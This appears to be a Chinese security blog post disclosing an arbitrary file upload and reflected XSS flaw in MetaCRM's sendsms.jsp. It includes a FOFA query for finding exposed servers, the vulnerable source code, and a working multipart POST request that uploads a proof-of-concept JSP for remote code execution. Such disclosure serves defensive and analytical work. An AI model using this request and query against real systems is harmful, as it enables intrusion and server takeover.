---
title: "MetaCRM 客户关系管理系统 sendsms.jsp 任意文件上传漏洞"
source: https://mrxn.net/jswz/metasoft-business-sendsms-upload-rce.html
asset_dir: assets/metacrm-客户关系管理系统-sendsms.jsp-任意文件上传漏洞
---

# MetaCRM 客户关系管理系统 sendsms.jsp 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/1 08:31
- 1364浏览
- [0评论](#comment)
- 21分钟阅读

深入探索

业务过程

脚本语言

脚本

---

# 漏洞简介

MetaCRM 是一款广泛应用于企业客户信息管理、[业务流程](#)自动化及销售支持的[客户关系管理](#)系统。该系统中的 sendsms.jsp 接口存在[任意文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)，攻击者无需经过严格身份验证即可向服务器上传任意类型的文件，包括可执行的恶意[脚本](#)。一旦利用此漏洞，攻击者可能在服务器上部署后门、WebShell 等恶意程序，从而实现[远程代码执行](https://mrxn.net/tag/rce)、服务器控制，甚至进一步窃取敏感数据或破坏业务系统的正常运行。该漏洞严重威胁系统的安全性与数据完整性，需及时修补和加固防护。

客户关系管理

# 影响版本

# fofa语法

```
body="/common/scripts/basic.js" && body="www.metacrm.com.cn"
```

深入探索

鉴权

应用程序

企业安全咨询

# 漏洞分析

我们直接看 `sendsms.jsp` 的业务逻辑实现

```
<%

    com.metasoft.framework.pub.upload.Upload myUpload=new com.metasoft.framework.pub.upload.Upload();   
    myUpload.initialize(pageContext);
    myUpload.upload();

    String touser = myUpload.getRequest().getParameter("touser");
    String subject = myUpload.getRequest().getParameter("subject");

    String affix = myUpload.getFiles().getFile(0).getFileName();
    String body = myUpload.getRequest().getParameter("body");

    int iCount = myUpload.getFiles().getFile(0).getSize();

    //System.out.println("iCount="+iCount);

    String path = com.metasoft.framework.pub.util.Path.getUserFile()+"temp"+java.io.File.separator;
    String fileFullName = "";

    if (iCount != 0) {
        String fieldID = com.metasoft.framework.pub.util.UUID.getID();
        if(affix.indexOf(".")!=-1)
            fieldID +=affix.substring(affix.lastIndexOf("."));

        myUpload.saveAs(path, fieldID);
        fileFullName = path+fieldID;

    }

    %>
```

直接使用用户上传的文件名（`affix`）的扩展名（如`.jsp`）拼接生成服务器文件名（`fieldID`）。攻击者可上传恶意[脚本](#)文件（如`.jsp`），从而导致任意[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)。

同时该文件还存在反射性[XSS漏洞](https://mrxn.net/tag/xss)，因HTML表单部分 `<input type="hidden" name="touser" value="<%=touser%>" />` 的数据来自用户提交，直接通过 `myUpload.getRequest().getParameter("touser")` 获取，并使用 JSP 表达式 `<%= %>` 直接输出到HTML中。缺失了对输入的转义或 sanitization。其他 subject、affix 等参数也是如此。

漏洞修复方案

# 漏洞复现

```
POST /business/common/sms/sendsms.jsp HTTP/1.1
Host: metasoft.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="1.jsp "

<%out.println(new java.util.Random().nextInt(100));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundary--
```

[![MetaCRM 客户关系管理系统 sendsms.jsp 任意文件上传漏洞](images/img-001-31588b2dfaff.webp)](https://image.mrxn.net/b124b584867949deaaea37b0e2094f4b.webp)

响应里回显了上传文件路径，直接访问，成功执行上传代码达到[RCE](https://mrxn.net/tag/rce)

[![MetaCRM 客户关系管理系统 sendsms.jsp 任意文件上传漏洞](images/img-002-2bb3b87329b0.webp)](https://image.mrxn.net/fe7f063773d84a73aa8333261a157be3.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
